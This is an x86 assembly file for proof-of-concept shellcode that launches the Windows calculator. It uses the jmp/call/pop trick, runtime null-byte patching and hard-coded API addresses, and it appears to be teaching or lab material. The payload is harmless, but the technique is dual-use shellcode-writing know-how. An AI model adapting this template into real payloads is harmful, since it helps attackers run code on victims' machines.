; Shellcode to open a calculator
; Assembly Command: ml scCalc.asm (/link /entry:mainCRTStartup /SUBSYSTEM:CONSOLE /SECTION:.text,RWE) <-- compile to executable
.model flat

.code 

mainCRTStartup PROC
        jmp shell32_dll
    loadlibraryA: 
        pop ebx
        xor edx, edx
        mov byte ptr [ebx + 11], dl
        push ebx

        ;mov eax,77be9100h
        mov eax, 76bb9100h
        call eax ;loadlibraryA

        jmp shell_execute
    GetProcAddress:
        pop ebx
        xor edx, edx
        mov byte ptr [ebx + 13], dl
        push ebx
        push eax
        ;mov eax, 77be5930h
        mov eax, 76bb5930h 
        call eax ;GetProcAddress

        jmp calc
    ShellExecuteA1:
        pop ebx
        xor edx, edx
        mov byte ptr [ebx + 8], dl

        jmp open
    ShellExecuteA2:
        pop ecx
        xor edx, edx
        mov byte ptr [ecx + 4], dl

        xor edx, edx

        push 5
        push edx
        push edx
        push ebx
        push ecx
        push edx
        call eax ;ShellExecuteA

        xor edx, edx

        push edx
        ;mov eax, 77bef380h
        mov eax, 76bbf380h 
        call eax ;ExitProcess

    shell32_dll:
        call loadlibraryA
        db "Shell32.dllX"

    shell_execute:
        call GetProcAddress
        db "ShellExecuteAX"

    calc:
        call ShellExecuteA1
        db "calc.exeX"

    open:
        call ShellExecuteA2
        db "openX"

mainCRTStartup ENDP

end